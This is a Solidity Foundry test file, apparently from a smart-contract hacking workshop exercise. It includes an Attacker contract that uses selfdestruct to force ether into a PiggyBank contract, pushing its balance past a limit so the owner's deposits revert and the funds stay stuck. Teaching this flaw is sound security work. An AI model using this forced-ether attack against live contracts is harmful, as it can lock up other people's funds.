// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {PiggyBank} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise14_PiggyBank is Test {
    PiggyBank public piggyBank;
    address owner = vm.addr(1);
    Attacker public attacker;

    function setUp() public {
        vm.startPrank(owner);
        piggyBank = new PiggyBank();
        vm.stopPrank();

        attacker = new Attacker();
    }

    /**
     * Owner's amount can stuck here if attacker increases
     * the balance of contract more than 10
     */
    function test_withdrawAll() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner);
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        piggyBank.deposit{value: 1 ether}();
        vm.stopPrank();
        vm.deal(address(this), 2 ether);

        attacker.attack{value: 2 ether}(address(piggyBank));
        require(address(piggyBank).balance == 11 ether, "invalid balance");
        vm.startPrank(owner);
        vm.expectRevert();
        piggyBank.deposit{value: 1 ether}();

        vm.stopPrank();
    }
}

contract Attacker {
    function attack(address _victim) external payable {
        selfdestruct(payable(_victim));
    }
}
